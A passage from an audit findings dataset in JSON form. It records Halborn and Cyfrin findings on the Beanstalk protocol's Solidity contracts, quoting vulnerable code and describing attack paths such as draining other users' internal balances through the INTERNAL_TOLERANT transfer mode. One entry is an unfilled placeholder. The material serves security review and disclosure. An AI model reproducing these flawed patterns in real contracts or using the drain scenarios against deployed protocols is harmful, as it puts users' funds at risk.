      "content": "##### Description\n\nIn the `CurveFacet` there are multiple functions that make use of the `approveToken()` function, for example:\n\n#### CurveFacet.sol\n\n```\nfunction exchange(\n    address pool,\n    address fromToken,\n    address toToken,\n    uint256 amountIn,\n    uint256 minAmountOut,\n    bool stable,\n    LibTransfer.From fromMode,\n    LibTransfer.To toMode\n) external payable nonReentrant {\n    (int128 i, int128 j) = getIandJ(fromToken, toToken, pool, stable);\n    amountIn = IERC20(fromToken).receiveToken(\n        amountIn,\n        msg.sender,\n        fromMode\n    );\n    IERC20(fromToken).approveToken(pool, amountIn);\n\n    if (toMode == LibTransfer.To.EXTERNAL) {\n        ICurvePoolR(pool).exchange(\n            i,\n            j,\n            amountIn,\n            minAmountOut,\n            msg.sender\n        );\n    } else {\n        uint256 amountOut = ICurvePool(pool).exchange(\n            i,\n            j,\n            amountIn,\n            minAmountOut\n        );\n        msg.sender.increaseInternalBalance(IERC20(toToken), amountOut);\n    }\n}\n\n```\n\n\\color{black}\n\\color{white}\n\n`pool` and `fromToken` are user controlled parameters. On the other hand, the `LibTransfer.From fromMode` set to `INTERNAL_TOLERANT` would allow anyone to bypass this `receiveToken()` call.\n\nThe only blocker to avoid an attacker of approving his own address and extract all the tokens of the contract is the following require statement:\n\n#### CurveFacet.sol\n\n```\nfunction getIandJ(\n    address from,\n    address to,\n    address pool,\n    bool stable\n) private view returns (int128 i, int128 j) {\n    address factory = stable ? STABLE_FACTORY : CRYPTO_FACTORY;\n    address[4] memory coins = ICurveFactory(factory).get_coins(pool);\n    i = 4;\n    j = 4;\n    for (uint256 _i = 0; _i < 4; ++_i) {\n        if (coins[_i] == from) i = int128(_i);\n        else if (coins[_i] == to) j = int128(_i);\n        else if (coins[_i] == address(0)) break;\n    }\n    require(i < 4 && j < 4, \"Curve: Tokens not in pool\");\n}\n\n```\n\nIn case of a malicious Curve Metapool Factory (`0xB9fC157394Af804a3578134A6585C0dc9cc990d4` or `0x0959158b6040D32d04c301A72CBFD6b39E21c9AE`), all the tokens in the contracts could be drained.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**ACKNOWLEDGED**: The `Beanstalk team` acknowledges this.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50528",
      "title": "FARMFACET: USE OF DELEGATECALL IN A FOR LOOP",
      "impact": "LOW",
      "content": "##### Description\n\nThe `FarmFacet` allows performing multiple `delegatecalls` inside a for loop:\n\n#### FarmFacet.sol\n\n```\nfunction _farm(bytes calldata data) private {\n    LibDiamond.DiamondStorage storage ds;\n    bytes32 position = LibDiamond.DIAMOND_STORAGE_POSITION;\n    assembly {\n        ds.slot := position\n    }\n    bytes4 functionSelector;\n    assembly {\n        functionSelector := calldataload(data.offset)\n    }\n    address facet = ds\n        .selectorToFacetAndPosition[functionSelector]\n        .facetAddress;\n    require(facet != address(0), \"Diamond: Function does not exist\");\n    (bool success, ) = address(facet).delegatecall(data);\n    require(success, \"FarmFacet: Function call failed!\");\n}\n\nfunction farm(bytes[] calldata data) external payable {\n    for (uint256 i = 0; i < data.length; i++) {\n        _farm(data[i]);\n    }\n    if (msg.value > 0 && address(this).balance > 0) {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\n            new bytes(0)\n        );\n        require(success, \"Farm: Eth transfer Failed.\");\n    }\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nIn this situation, `msg.sender` and `msg.value` would be persisted across the different iterations/delegatecalls in the loop. For example, a user could submit 1 Ether as `msg.value` to the `farm(bytes[] calldata data)` call and in the `data` array add 3 different calls that each of those made use of that Ether. If the `Diamond` contract had some Ether, user would be paying just that Ether and the 2 remaining Ether would be taken from the smart contract balance.\n\nCurrently, there is no exploitation path for this issue, as the contracts should never be holding any Ether. Also, the remaining Ether in the contract is sent back to `msg.sender` after the `_farm()` calls.\n\nFor this reason, we have set this risk as informational.\n\n[Multi Delegatecall: Solidity 0.8](https://youtu.be/NkTWU6tc9WU?t=361)\n[samczsun's blog post](https://samczsun.com/two-rights-might-make-a-wrong/)\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED/ACKNOWLEDGED**: The `Beanstalk team` is aware of the issue and will take this into account in future upgrades.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50527",
      "title": "POD PRICE IS LIMITED TO 16.7 BEANS",
      "impact": "LOW",
      "content": "##### Description\n\nIn the `MarketplaceFacet`, the functions `createPodListing()` and `createPodOrder()` make use of an `uint24` to hold the `pricePerPod` parameter.\n\nAs the maximum value that an `uint24` can hold is `16_777215` the users will not be able to set a price higher than that for a Pod.\n\n#### MarketplaceFacet.sol\n\n```\nfunction createPodListing(\n    uint256 index,\n    uint256 start,\n    uint256 amount,\n    uint24 pricePerPod,\n    uint256 maxHarvestableIndex,\n    LibTransfer.To mode\n) external payable {\n    _createPodListing(\n        index,\n        start,\n        amount,\n        pricePerPod,\n        maxHarvestableIndex,\n        mode\n    );\n}\n\n```\n\n\\color{black}\n\\color{white}\n\n#### MarketplaceFacet.sol\n\n```\nfunction createPodOrder(\n    uint256 beanAmount,\n    uint24 pricePerPod,\n    uint256 maxPlaceInLine,\n    LibTransfer.From mode\n) external payable returns (bytes32 id) {\n    beanAmount = LibTransfer.receiveToken(C.bean(), beanAmount, msg.sender, mode);\n    return _createPodOrder(beanAmount, pricePerPod, maxPlaceInLine);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` documented their code mentioning that the highest price to list a Pod for is `16_777215` Beans:\n\n#### MarketplaceFacet.sol\n\n```\n// Note: pricePerPod is bounded by 16_777_215 Beans.\nfunction createPodListing(\n    uint256 index,\n    uint256 start,\n    uint256 amount,\n    uint24 pricePerPod,\n    uint256 maxHarvestableIndex,\n    LibTransfer.To mode\n) external payable {\n    _createPodListing(\n        index,\n        start,\n        amount,\n        pricePerPod,\n        maxHarvestableIndex,\n        mode\n    );\n}\n\n```\n\n\\color{black}\n\\color{white}\n\n#### MarketplaceFacet.sol\n\n```\n// Note: pricePerPod is bounded by 16_777_215 Beans.\nfunction createPodOrder(\n    uint256 beanAmount,\n    uint24 pricePerPod,\n    uint256 maxPlaceInLine,\n    LibTransfer.From mode\n) external payable returns (bytes32 id) {\n    beanAmount = LibTransfer.receiveToken(C.bean(), beanAmount, msg.sender, mode);\n    return _createPodOrder(beanAmount, pricePerPod, maxPlaceInLine);\n}\n\n```\n\n\\color{black}\n\\color{white}",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50526",
      "title": "FERTILIZERPREMINT.BUYANDMINT FUNCTION COULD BE SANDWICHED",
      "impact": "LOW",
      "content": "##### Description\n\nIn the `FertilizerPreMint`, the function `buy()` is used to swap Ether into USDC through the UniswapV3 router:\n\n#### FertilizerPreMint.sol\n\n```\nfunction buy(uint256 minAmountOut) private returns (uint256 amountOut) {\n    IWETH(WETH).deposit{value: msg.value}();\n    ISwapRouter.ExactInputSingleParams memory params =\n        ISwapRouter.ExactInputSingleParams({\n            tokenIn: WETH,\n            tokenOut: USDC,\n            fee: POOL_FEE,\n            recipient: CUSTODIAN,\n            deadline: block.timestamp,\n            amountIn: msg.value,\n            amountOutMinimum: minAmountOut,\n            sqrtPriceLimitX96: 0\n        });\n    amountOut = ISwapRouter(SWAP_ROUTER).exactInputSingle(params);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nThe `amountOutMinimum` is set with a user controlled parameter `minAmountOut`. If the Ether sent through `msg.value` is higher than the `minAmountOut` in USDC the transaction may get sandwiched causing the user to swap Ether for USDC at a higher cost, receiving less USDC for the same amount of Ether.\n\nThe issue was flagged as informational, as there is a function in the `FertilizerPreMint` contract that allows to get the exact amount of USDC for a given amount of Ether after swap. We assume that this function is used in the backend mitigating the issue. Only users interacting with the smart contract directly may have the problem described.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` documented their code mentioning that any slippage should be properly accounted by the users:\n\n#### FertilizerPreMint.sol\n\n```\n// Note: Slippage should be properly be accounted for in\n// minBuyAmount when calling the buyAndMint function directly.\nfunction buyAndMint(uint256 minBuyAmount) external payable nonReentrant {\n    uint256 amount = buy(minBuyAmount);\n    require(IUSDC.balanceOf(CUSTODIAN) <= MAX_RAISE, \"Fertilizer: Not enough remaining\");\n    __mint(amount);\n}\n\n```\n\n\\color{black}\n\\color{white}",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50525",
      "title": "MULTIPLE OVERFLOWS IN MARKETPLACEFACET",
      "impact": "LOW",
      "content": "##### Description\n\nFinding description placeholder\n\n##### Score\n\nImpact:   \nLikelihood:",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50524",
      "title": "UNLIMITED FERTILIZER CAN BE BOUGHT THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIn the `FertilizerFacet` contract, the `mintFertilizer()` function checks if the `amount` provided by the user is higher than the remaining amount of Fertilizer and if that is the case, `_amount` is overwritten with the `remaining` Fertilizer preventing users to buy more Fertilizer than what is remaining:\n\n#### FertilizerFacet.sol\n\n```\nfunction mintFertilizer(\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint256 remaining = LibFertilizer.remainingRecapitalization();\n    uint256 _amount = uint256(amount);\n    if (_amount > remaining) _amount = remaining;\n    LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    );\n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nAlthough, the contract wrongly uses the `amount` variable instead of `_amount` allowing users to mint more Fertilizer than what is remaining:\n\n![5.png](https://halbornmainframe.com/proxy/audits/images/659e8389a1aa3698c0e94dfe)\n\n##### Score\n\nImpact: 3  \nLikelihood: 3\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` corrected the issue:\n\n#### FertilizerFacet.sol\n\n```\nfunction mintFertilizer(\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint128 remaining = uint128(LibFertilizer.remainingRecapitalization()); // remaining <= 77_000_000 so downcasting is safe.\n    if (amount > remaining) amount = remaining;\n    amount = uint128(LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    ).div(1e6)); // return value <= amount, so downcasting is safe.\n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf);\n}\n\n```\n\n\\color{black}\n\\color{white}",
      "summary": "\nThe `FertilizerFacet` contract has a bug where users can mint more fertilizer than what is remaining. This is because the contract uses the `amount` variable instead of `_amount`, allowing users to bypass the check for remaining fertilizer. The impact and likelihood of this bug are both rated as 3 out of 5. The recommendation is to update the contract to use the correct variable and to make sure that the downcasting is safe. This issue has been solved by the `Beanstalk team` by correcting the code in the `FertilizerFacet.sol` file.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50523",
      "title": "INCONSISTENT INTERNAL BALANCES WHEN SUPPLYING TRANSFER-ON-FEE OR DEFLATIONARY TOKENS",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIn the library `LibTransfer`, used by the `TokenFacet` contract, the `transferToken()` function assume that the amount of `token` is transferred to the smart contract after calling `token.safeTransferFrom(sender, address(this), amount - receivedAmount);` (and thus it updates the states variables accordingly). For example:\n\n#### LibTransfer.sol\n\n```\nfunction transferToken(\n    IERC20 token,\n    address recipient,\n    uint256 amount,\n    From fromMode,\n    To toMode\n) internal returns (uint256 transferredAmount) {\n    if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n        token.transferFrom(msg.sender, recipient, amount);\n        return amount;\n    }\n    amount = receiveToken(token, amount, msg.sender, fromMode);\n    sendToken(token, amount, recipient, toMode);\n    return amount;\n}\n\nfunction receiveToken(\n    IERC20 token,\n    uint256 amount,\n    address sender,\n    From mode\n) internal returns (uint256 receivedAmount) {\n    if (amount == 0) return 0;\n    if (mode != From.EXTERNAL) {\n        receivedAmount = LibBalance.decreaseInternalBalance(\n            sender,\n            token,\n            amount,\n            mode != From.INTERNAL\n        );\n        if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT)\n            return receivedAmount;\n    }\n    token.safeTransferFrom(sender, address(this), amount - receivedAmount);\n    return amount;\n}\n\nfunction sendToken(\n    IERC20 token,\n    uint256 amount,\n    address recipient,\n    To mode\n) internal {\n    if (amount == 0) return;\n    if (mode == To.INTERNAL)\n        LibBalance.increaseInternalBalance(recipient, token, amount);\n    else token.safeTransfer(recipient, amount);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nHowever, this may not be true if the `token` is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount in the different state variables.\n\n![1.png](https://halbornmainframe.com/proxy/audits/images/659e8386a1aa3698c0e94df2)\n\n##### Score\n\nImpact: 3  \nLikelihood: 3\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` addressed the issue and now supports transfer-on-fee tokens:\n\n#### LibTransfer.sol\n\n```\nfunction transferToken(\n    IERC20 token,\n    address recipient,\n    uint256 amount,\n    From fromMode,\n    To toMode\n) internal returns (uint256 transferredAmount) {\n    if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n        uint256 beforeBalance = token.balanceOf(recipient);\n        token.safeTransferFrom(msg.sender, recipient, amount);\n        return token.balanceOf(recipient).sub(beforeBalance);\n    }\n    amount = receiveToken(token, amount, msg.sender, fromMode);\n    sendToken(token, amount, recipient, toMode);\n    return amount;\n}\n\nfunction receiveToken(\n    IERC20 token,\n    uint256 amount,\n    address sender,\n    From mode\n) internal returns (uint256 receivedAmount) {\n    if (amount == 0) return 0;\n    if (mode != From.EXTERNAL) {\n        receivedAmount = LibBalance.decreaseInternalBalance(\n            sender,\n            token,\n            amount,\n            mode != From.INTERNAL\n        );\n        if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT)\n            return receivedAmount;\n    }\n    uint256 beforeBalance = token.balanceOf(address(this));\n    token.safeTransferFrom(sender, address(this), amount - receivedAmount);\n    return receivedAmount.add(token.balanceOf(address(this)).sub(beforeBalance));\n}\n\n```\n\n\\color{black}\n\\color{white}",
      "summary": "\nThe report describes a bug in the `LibTransfer` library, which is used by the `TokenFacet` contract. The `transferToken()` function assumes that the full amount of tokens is transferred to the smart contract, but this may not be true for certain types of tokens. This can cause discrepancies in the state variables. The impact and likelihood of this bug are rated as 3 out of 5. The recommendation is to update the code to support transfer-on-fee tokens, which has been done by the Beanstalk team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50522",
      "title": "ACTIVE FERTILIZER WILL BE CLAIMED AUTOMATICALLY BY THE SENDER DURING A SAFETRANSFERFROM CALL",
      "impact": "LOW",
      "content": "##### Description\n\nThe `Fertilizer` contract contains the following `_beforeTokenTransfer()` hook:\n\n#### Fertilizer.sol\n\n```\nfunction _beforeTokenTransfer(\n    address, // operator,\n    address from,\n    address to,\n    uint256[] memory ids,\n    uint256[] memory, // amounts\n    bytes memory // data\n) internal virtual override {\n    uint256 bpf = uint256(IBS(owner()).beansPerFertilizer());\n    if (from != address(0)) _update(from, ids, bpf);\n    _update(to, ids, bpf);\n}\n\n```\n\nThis hook will be called with every `safeTransferFrom()` or `safeBatchTransferFrom()` call and will claim the fertilizer claimable amount automatically on behalf of the sender:\n\n![6.png](https://halbornmainframe.com/proxy/audits/images/659e838aa1aa3698c0e94e01)\n\nIf the amount of claimable fertilizer is zero, the receiver will get the full unfertilized amount as expected:\n\n![7.png](https://halbornmainframe.com/proxy/audits/images/659e838ba1aa3698c0e94e04)\n\nThis could allow the following scenario:\n\n1. By making use of a third-party marketplace, user1 puts for sale his Fertilizer at a low price. That fertilizer id can be fully claimed at that time.\n2. User2 buys the fertilizer planning to claim it afterwards and make some profit, but the fertilizer is claimed automatically on behalf of user1 during the `safeTransferFrom()` call and the user2 just receives an already claimed fertilizer.\n\n##### Score\n\nImpact: 2  \nLikelihood: 3\n\n##### Recommendation\n\n**RISK ACCEPTED**: The `Beanstalk team` accepts this risk.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50521",
      "title": "MISSING REQUIRE CHECK IN TOKENFACET.WRAPETH FUNCTION",
      "impact": "LOW",
      "content": "##### Description\n\nIn the `TokenFacet` contract, the `wrapEth(uint256 amount, LibTransfer.To mode)` function wraps the `amount`of Ether into WETH and sends it to the user internal/external balance:\n\n#### TokenFacet.sol\n\n```\nfunction wrapEth(uint256 amount, LibTransfer.To mode) external payable {\n    LibWeth.wrap(amount, mode);\n}\n\n```\n\n#### LibWeth.sol\n\n```\nfunction wrap(uint256 amount, LibTransfer.To mode) internal {\n    deposit(amount);\n    LibTransfer.sendToken(IERC20(WETH), amount, msg.sender, mode);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nAs the `msg.value` is never compared to the `amount` parameter, if the `msg.value` sent by the user was higher than the `amount` the difference would be taken by the contract and any other user would be able to steal it.\n\n![2.png](https://halbornmainframe.com/proxy/audits/images/659e8387a1aa3698c0e94df5)\n\n##### Score\n\nImpact: 3  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` corrected the issue. Ether refunds were added instead of a require check. If there is leftover Ether in the contract, then it will be refunded.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50520",
      "title": "SEASONFACET.INCENTIVIZE EXPONENTIAL INCENTIVE LOGIC IS NOT WORKING",
      "impact": "LOW",
      "content": "##### Description\n\nIn the `SeasonFacet` contract, the `incentivize()` function is used to send some Beans to the user that successfully called `sunrise()` to start a new season:\n\n#### SeasonFacet.sol\n\n```\nfunction incentivize(address account, uint256 amount) private {\n    uint256 timestamp = block.timestamp.sub(\n        s.season.start.add(s.season.period.mul(season()))\n    );\n    if (timestamp > 300) timestamp = 300;\n    uint256 incentive = LibIncentive.fracExp(amount, 100, timestamp, 1);\n    C.bean().mint(account, amount);\n    emit Incentivization(account, incentive);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nAs we can see, the rewards/timestamp is capped at a maximum of 300 seconds and makes use of exponential rewards. But then, in the `mint` call, the `amount` parameter is incorrectly used instead of `incentive`, which means that the caller will always receive a fixed amount of beans (100):\n\n![incentives1.png](https://halbornmainframe.com/proxy/audits/images/659e838ba1aa3698c0e94e07)\n\n##### Score\n\nImpact: 3  \nLikelihood: 1\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` corrected the issue and updated the code as suggested.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50519",
      "title": "USDC OF THE INTERNAL BALANCE CAN BE DRAINED BY ANY USER THROUGH THE FERTILIZERFACET.MINTFERTILIZER FUNCTION",
      "impact": "HIGH",
      "content": "##### Description\n\nIn the `FertilizerFacet`, the `mintFertilizer()` function is used to buy Fertilizer in exchange for USDC:\n\n#### FertilizerFacet.sol\n\n```\nfunction mintFertilizer(\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint256 remaining = LibFertilizer.remainingRecapitalization();\n    uint256 _amount = uint256(amount);\n    if (_amount > remaining) _amount = remaining;\n    LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    );\n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf);\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nThis function has the same issue that was described in `HAL01 - INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING FUNCTION` as the value returned by `receiveToken()` is not checked, users can abuse this and buy Fertilizer with the USDC of other users internal balance through the `INTERNAL_TOLERANT` fromMode.\n\n##### Score\n\nImpact: 5  \nLikelihood: 5\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` corrected the issue by considering the returned value of the `receiveToken()` call:\n\n#### FertilizerFacet.sol\n\n```\nfunction mintFertilizer(\n    uint128 amount,\n    uint256 minLP,\n    LibTransfer.From mode\n) external payable {\n    uint128 remaining = uint128(LibFertilizer.remainingRecapitalization()); // remaining <= 77_000_000 so downcasting is safe.\n    if (amount > remaining) amount = remaining;\n    amount = uint128(LibTransfer.receiveToken(\n        C.usdc(),\n        uint256(amount).mul(1e6),\n        msg.sender,\n        mode\n    ).div(1e6)); // return value <= amount, so downcasting is safe.\n    uint128 id = LibFertilizer.addFertilizer(\n        uint128(s.season.current),\n        amount,\n        minLP\n    );\n    C.fertilizer().beanstalkMint(msg.sender, uint256(id), amount, s.bpf);\n}\n\n```\n\n\\color{black}\n\\color{white}",
      "summary": "\nThe `FertilizerFacet` has a function called `mintFertilizer()` that allows users to buy Fertilizer using USDC. However, there is a bug where the value returned by the `receiveToken()` function is not checked, which means users can exploit this and use the USDC from other users' internal balance to buy Fertilizer. This issue has a high impact and likelihood of occurring. The recommendation is to update the code to check the return value of `receiveToken()` to prevent this exploit. This issue has been solved by the Beanstalk team by updating the code to consider the return value of `receiveToken()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50518",
      "title": "INTERNAL BALANCE TOKENS CAN BE DRAINED THROUGH THE CURVEFACET.EXCHANGEUNDERLYING FUNCTION",
      "impact": "HIGH",
      "content": "##### Description\n\nIn the `CurveFacet`, the `exchangeUnderlying()` function is used to swap underlying assets from different Curve stable pools:\n\n#### CurveFacet.sol\n\n```\nfunction exchangeUnderlying(\n    address pool,\n    address fromToken,\n    address toToken,\n    uint256 amountIn,\n    uint256 minAmountOut,\n    LibTransfer.From fromMode,\n    LibTransfer.To toMode\n) external payable nonReentrant {\n    (int128 i, int128 j) = getUnderlyingIandJ(fromToken, toToken, pool);\n    IERC20(fromToken).receiveToken(amountIn, msg.sender, fromMode);\n    IERC20(fromToken).approveToken(pool, amountIn);\n\n    if (toMode == LibTransfer.To.EXTERNAL) {\n        ICurvePoolR(pool).exchange_underlying(\n            i,\n            j,\n            amountIn,\n            minAmountOut,\n            msg.sender\n        );\n    } else {\n        uint256 amountOut = ICurvePool(pool).exchange_underlying(\n            i,\n            j,\n            amountIn,\n            minAmountOut\n        );\n        msg.sender.increaseInternalBalance(IERC20(toToken), amountOut);\n    }\n}\n\n```\n\n\\color{black}\n\\color{white}\n\nThe `LibTransfer.From fromMode` has 4 different modes:\n\n* `EXTERNAL`\n* `INTERNAL`\n* `EXTERNAL_INTERNAL`\n* `INTERNAL_TOLERANT`\n\nWith the `INTERNAL_TOLERANT` fromMode tokens will be collected from the user's Internal Balance and the transaction will not fail if there is not enough tokens there.\n\nAs in the `receiveToken()` call, users can use the `INTERNAL_TOLERANT` fromMode and the value returned by `receiveToken()` is not checked users can abuse this and swap tokens that belong to other users (tokens that are part of other users' internal balance).\n\nPool: [0x99AE07e7Ab61DCCE4383A86d14F61C68CdCCbf27](https://etherscan.io/address/0x99AE07e7Ab61DCCE4383A86d14F61C68CdCCbf27)\nUnderlying WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599](https://etherscan.io/address/0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)\nUnderlying sBTC: [0xfE18be6b3Bd88A2D2A7f928d00292E7a9963CfC6](https://etherscan.io/address/0xfE18be6b3Bd88A2D2A7f928d00292E7a9963CfC6)\n\n1. User8 transfers `10_000000000000000000` sBTC tokens to his internal balance.\n2. User2 calls `exchangeUnderlying()` with an `INTERNAL_TOLERANT` fromMode, setting as the `amountIn` `10_000000000000000000` and as `fromToken` the sBTC token address. These sBTC tokens do belong to user8.\n3. User2 successfully swaps for free the sBTC for the WBTC tokens, getting `10_00184757` WBTC in his external balance.\n4. Now User8 tries to withdraw from his internal balance the `10_000000000000000000` sBTC tokens he had deposited previously, but the transactions fails as the contract does not have those tokens anymore. They were swapped and stolen by user2.\n\n![4.png](https://halbornmainframe.com/proxy/audits/images/659e8389a1aa3698c0e94dfb)\n\n##### Score\n\nImpact: 5  \nLikelihood: 5\n\n##### Recommendation\n\n**SOLVED**: The `Beanstalk team` corrected the issue by overwritting `amountIn` with the value returned from the `receiveToken()` call, as suggested.",
      "summary": "\nThe report describes a bug in the CurveFacet contract, specifically in the `exchangeUnderlying()` function. This function is used to swap underlying assets from different Curve stable pools. The bug allows users to swap tokens that belong to other users, resulting in stolen tokens. The bug occurs when a user sets the `fromMode` to `INTERNAL_TOLERANT` and the value returned by the `receiveToken()` call is not checked. This can be abused by users to swap tokens that belong to other users. The report provides details of the pool and underlying tokens involved in the bug, along with the steps to reproduce it. It also includes a screenshot showing the stolen tokens. The bug has been assigned an impact and likelihood score of 5, and the recommendation is to overwrite `amountIn` with the value returned from the `receiveToken()` call to solve the issue. The Beanstalk team has already implemented this solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Beanstalk",
      "source_link": "https://www.halborn.com/audits/beanstalk/beanstalk-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "31258",
      "title": "State variables should be cached to avoid unnecessary storage accesses",
      "impact": "GAS",
      "content": "As shown below, `s.season.current` can be cached to save one storage access:\n```diff\n    // SeasonFacet.sol\n    function stepSeason() private {\n+       uint32 _current = s.season.current + 1\n        s.season.timestamp = block.timestamp;\n-       s.season.current += 1;\n+       s.season.current = _current ;\n        s.season.sunriseBlock = uint32(block.number); // Note: Will overflow in the year 3650.\n-       emit Sunrise(season());\n+       emit Sunrise(_current );\n    }\n```\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Beanstalk",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-12-cyfrin-beanstalk.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Alex Roan",
        "Giovanni Di Siena",
        "Carlos Amarante"
      ]
    },
    {
      "id": "31257",
      "title": "Execution of `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment` can end earlier when `lastUpdate == stemStartSeason`",
      "impact": "GAS",
